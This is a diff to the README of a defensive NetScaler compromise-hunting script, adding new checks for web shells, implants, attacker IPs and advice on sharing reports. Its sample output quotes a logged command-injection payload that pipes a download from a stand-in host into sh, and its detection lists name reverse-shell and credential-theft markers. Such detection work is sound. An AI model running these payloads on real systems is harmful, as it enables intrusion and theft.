@@ -31,8 +31,8 @@ sh nshunt.sh
 ```
 
 The output is shown on screen and saved to `results-nshunt.txt` in the current
-directory (`/var/tmp` survives a reboot, `/tmp` does not). Set
-`NSHUNT_OUT=/path/file` to save it elsewhere.
+directory (`/var/tmp` survives a reboot, `/tmp` does not), readable by root
+only. Set `NSHUNT_OUT=/path/file` to save it elsewhere.
 
 The script changes nothing on the appliance. Apart from the results file it only
 creates a temporary directory in `/tmp`, which it removes when it finishes. It needs nothing beyond
@@ -52,11 +52,14 @@ Each finding is labelled:
 | `ATTEMPT`    | Attack **attempts** found in the logs still on the appliance. An attempt is not a success - only `COMPROMISE` findings are signs that an attack worked |
 | `REVIEW`     | Unusual, needs a human look - often legitimate |
 
-The second line shows the running build (from the booted firmware file) and
-whether it includes the fix for CVE-2026-88771/88772, with its install date
-and the last boot in UTC. Command injection attempts from before the install
-date are marked `BEFORE the fixed build was installed`: only those could have
-run commands.
+The second line shows the running build (from the booted firmware) and
+whether it includes the fix for CVE-2026-88771/88772, and since when the fixed
+build has been **running** (UTC). Installing a build does not protect the box -
+the old build runs until the next boot - so this is the first boot after the
+install (`installns_state_post_reboot`), else a boot within a day of the
+install, else the install time of `/flash/ns-<build>.gz` (then the output says
+the reboot is not known). Command injection attempts from before that time are
+marked `BEFORE the fixed build was running`: only those could have run commands.
 
 The numbers in the `RESULT` line count finding blocks, i.e. kinds of evidence,
 not IP addresses or attempts. The output ends with a short "What this means"
@@ -65,15 +68,15 @@ section that explains the result in plain words.
 Example:
 
 ```
-NetScaler quick hunt 1.5 - ns01 - 2026-09-30 14:43
-Build: 14.1-73.37 - includes the fix for CVE-2026-88771/88772 (installed 2026-09-28 11:48 UTC)
-       running since the last boot, 2026-09-28 11:55 UTC
+NetScaler quick hunt 1.6 - ns01 - 2026-09-30 14:43
+Build: 14.1-73.37 - includes the fix for CVE-2026-88771/88772
+       fixed build running since 2026-09-28 11:55 UTC (first boot after the install; installed 2026-09-28 11:48 UTC)
 
 [COMPROMISE] CVE-2019-19781 exploit files: this box was exploited (Jan 2020 wave)
        2020-01-11 16:04  /var/vpn/bookmark/pwnpzi1337.xml  (exploit file name)
 
 [ATTEMPT] Shell commands sent in the VPN login name (command injection)
-       203.0.113.10     3 attempt(s)  2026-09-27 07:28 .. 2026-09-29 13:31 UTC  <- BEFORE the fixed build was installed
+       203.0.113.10     3 attempt(s)  2026-09-27 07:28 .. 2026-09-29 13:31 UTC  <- BEFORE the fixed build was running
          tried: pitboss PPE unexpectedly died NSPPE;U=http://203.0.113.10:8899/s;curl${IFS}$U|sh;# X
        Files the attacks tried to create:
          not present now (never created, or removed since): /var/netscaler/logon/LogonPoint/x.html
@@ -148,10 +151,13 @@ If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still
 8. **Unknown setuid/setgid programs** outside the standard system folders and
    the NetScaler's own `ping`/`traceroute`.
 9. **Crontabs** - user crontabs in `/var/cron/tabs`, and `/etc/crontab` lines
-   that download from anywhere but the appliance itself.
+   that download from anywhere but the appliance itself. User cron jobs that
+   delete or empty logs and files (trace wiping) are `COMPROMISE`.
 10. **Unknown programs in temp folders** (`/tmp`, `/var/tmp`, `/var/nstmp`),
     excluding the NIC firmware tools and caches that NetScaler upgrades leave there,
-    the NetScaler Console Security Advisory scan scripts and the admin GUI's
+    the NetScaler Console Security Advisory scan scripts, IoC scanners copied
+    there (`nshunt.sh`, Citrix's `ioc-script*.sh` / `ioc-scanner*.tgz`,
+    `ctx697096_check.sh`, also in subfolders) and the admin GUI's
     `log-YYYY-MM-DD.php` framework logs. Many files with the same name pattern
     are shown as one line. Scripts that run a decoded payload or web request
     input (`eval(base64_decode(...))`, `exec(base64.b64decode(...))`,
@@ -169,6 +175,8 @@ If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still
 12. **Startup scripts** (`rc.netscaler`, `nsbefore.sh`, `nsafter.sh`) that run
     Python, base64 loaders, downloads or `chmod +s` at boot, and decoders,
     Python one-liners or reversed path strings in `ns.conf` and `/etc/rc`.
+    `nsafter.sh` writing into the web folders or `httpd.conf`, setting setuid or
+    decoding payloads is `COMPROMISE`.
 13. **Disguised files** - `.deb` files in web folders that are not real packages
     (WHIPSHOT is a PHP web shell disguised as a `.deb`), scripts or PHP calls
     (`<?`, `eval(`, `base64_decode(`, `shell_exec(`) in the Gateway
@@ -178,9 +186,12 @@ If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still
     `.sig` files among the client packages are `REVIEW`.
 14. **Setuid shells** - `/bin/sh` or another shell or interpreter with the
     setuid/setgid bit, which gives web shells root.
-15. **SLAPSHOT tunnel and payload processes** - `/tmp/.uxdport`,
-    `/tmp/.uxdlock`, Python processes that execute base64 payloads, and running
-    `lula`, `update_c*.pl` or `/.x` processes.
+15. **SLAPSHOT tunnel, nsmon implant and payload processes** - `/tmp/.uxdport`,
+    `/tmp/.uxdlock`, Python processes that execute base64 payloads or carry
+    `UXD_IDLE_EXIT`, dropped SLAPSHOT Python files, running `lula`,
+    `update_c*.pl`, `/.x`, `xd7h` or `nsmon` processes, and the `nsmon.pl` Perl
+    implant (`/var/tmp/.nsmon`, `/var/tmp/.s`, its cron job, a Perl listener on a
+    port between 41000 and 41999).
 16. **Web access logs** (`httpaccess*.log*`, including the Gateway's
     `httpaccess-vpn.log`) - `404` answers over 5 KB on `/vpn/media/`,
     `/vpn/scripts/` or `/vpn/theme/` are `COMPROMISE`: WHIPSHOT hides its output
@@ -197,18 +208,23 @@ If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still
     minutes by a crash is `COMPROMISE` - Mandiant saw that pair on successful
     exploitation.
 18. **Known attacker IP addresses** published by Mandiant, GreyNoise, Lupovis,
-    Gotham Technology Group and Unit 42, in `ns.log*`, `/var/log/messages*` and the web
+    Gotham Technology Group, Unit 42, PitScaler.com and Arctic Wolf, and the
+    domains `echvista.com` / `entretiensol.com`, in `ns.log*`, `/var/log/messages*` and the web
     access logs, and in current connections. The Cloudflare WARP addresses on
-    the list are marked, because ordinary WARP users share them.
+    the list are marked, because ordinary WARP users share them. About 65
+    opportunistic scanners tagged by GreyNoise are listed separately as a
+    hunting lead only.
 19. **Files written by the published exploit payloads** - known dropped file
-    names (`/.x`, `/s`, `lula`, `/var/1.py`, `update_c*.pl`, `wtw*`,
+    names (`/.x`, `/s`, `lula`, `/var/1.py`, `update_c*.pl`, `wtw*` /
+    `watchTowr*` / `boom*` in `/tmp` and `/var/tmp`,
     `themes/wt88771*`, `nx_verify.html`, `c88771*`, `xua.html`, `/var/tmp/sh`,
-    the web shell package names in the Linux client folder (not the real
-    `nsginstaller64.deb`),
     `insight-new.js`, `admin_ui/e.txt` / `log.txt`), small files containing the
     output of `id`, and gzip, zip or tar archives disguised as web files - how a
     stolen `/flash/nsconfig` is staged for download. Only name, size and date are
-    shown, never the contents.
+    shown, never the contents. Real packages that carry a name the web shells
+    used (`nsg64.deb`, `nsgclient18.deb`, `nsgbuild.deb`, ...) are `REVIEW`:
+    some are also real Citrix client package names, so only their content
+    (check 13, 23) decides.
 20. **Exploit, scanner and probe strings** in the web and error logs - canary
     and scanner strings (`ns-88771-poc`, `PoCbit`, `NX-CVE-OK`, `httpworkbench`),
     requests for the `.ctxs.receiver` web shell, 1-byte `nsepa.deb` probes,
@@ -221,6 +237,11 @@ If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still
     it only exists if an injected command ran. HeadlessChrome requests are
     `REVIEW`. PHP errors raised inside a file with a non-PHP extension (`.sig`,
     `.deb`, `.ico`, ...) in the error logs are `COMPROMISE`: PHP executed it.
+    Also `ATTEMPT`: payload strings (`xd7h/`, `/dev/tcp/`, `nc -e`,
+    `base64 -w0`, `exec-ok`, web shell header names), attack payloads in
+    login-page requests (still visible after `ns.log` has rotated), any
+    `pitboss` packet-engine message with a shell character, and base64 PHP
+    (`PD9...`) in a User-Agent, shown decoded.
 21. **Shell history** (`sh.log*`, `bash.log*`) - commands that read LDAP
     credentials or keys (`ldapsearch`, `openssl s_client`, `F1.key` / `F2.key`,
     `/flash/nsconfig/keys`), restart the web server (`httpd -k restart`), set the
@@ -240,9 +261,38 @@ If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still
     saved `ns.conf` is compared with the newest older copy from before August
     2026 (`ns.conf.NS<old build>` from an upgrade, `ns.conf.0-4`, `.bak`): system
     users added since, and `NO_AUTH` EPA actions, are `REVIEW`.
+23. **Known web shells and payloads by hash and code** - SHA-256 of published
+    web shells and payloads (GreyNoise, IFIN, eSentire, Arctic Wolf, Unit 42) in
+    the web, plugin and media folders, `/tmp`, `/var/tmp` and the top of `/` and
+    `/var`; WHIPSHOT code (`HTTP_X_UX`, `HTTP_NSC_CLIENTTYPE` / `LDAP` with
+    `eval`) and the Unit 42 web shell's key, passphrase and token, also inside
+    real packages. Hashes change per victim, so the code markers matter more.
+    PHP / XHTML files elsewhere under `/var/netscaler` are `REVIEW`.
+
+## Sharing the output
+
+The report is meant for your security team and incident responders, not for
+public posting. It contains:
+
+- the appliance's host name, build and internal IP addresses (NSIP, VIP);
+- **user names**: VPN users from bookmark file names, admins and their PC IPs
+  from the command log, system accounts from the saved config;
+- file paths, theme names (often the company name) and log lines with
+  attacker and client IP addresses.
+
+It never prints file contents of configs, keys or config dumps. Lines that
+nshunt prints from shell history, startup scripts, crontabs and access logs
+are passed through a filter that masks passwords (`-w`, `-password`,
+`-bindpw`, `password=`, `pwd=`, `token=`, `user:pass@` in URLs), but that
+filter cannot know every format: **read the report before you share it**, and
+replace host names, user names and internal IPs if it leaves your organisation.
 
 ## Limitations
 
+- **Some appliances log `127.0.0.2` instead of the client IP** in the web
+  access logs. nshunt then says so: checks by IP in those logs cannot see who
+  sent a request. `ns.log` still has the real `Client_ip` for logins; use your
+  firewall or SIEM for the rest.
 - **Logs rotate quickly.** The log checks only see the `ns.log*` and
   `httpaccess*.log*` files still on the appliance, often just a day or two.
   Search your syslog server or SIEM for older attacks; the script prints how far
@@ -272,10 +322,11 @@ NSHUNT_ROOT=/mnt/netscaler-image sh nshunt.sh
 Many indicators come from public research by Mandiant / Google Threat
 Intelligence ([hunting guide](https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances)),
 Palo Alto Networks Unit 42 ([threat brief](https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/)), GreyNoise, watchTowr, Lupovis, CERT-EU and Kevin Beaumont. The
-checks added in 1.3 are based on the indicator list of Thomas Poppelgaard's
-[netscaler-ctx697096-checker](https://github.com/ThomasPoppelgaard/netscaler-ctx697096-checker),
-which includes indicators from Gotham Technology Group and Manuel Winkel
-(Deyda Consulting).
+checks added in 1.3 and 1.6 are based on the indicator lists of Thomas
+Poppelgaard's [netscaler-ctx697096-checker](https://github.com/ThomasPoppelgaard/netscaler-ctx697096-checker)
+(v1.7 - v1.9), which include indicators from Gotham Technology Group, Manuel
+Winkel (Deyda Consulting), PitScaler.com, Beazley Security, Arctic Wolf,
+eSentire, IFIN, Elastic and watchTowr.
 
 ## License
 
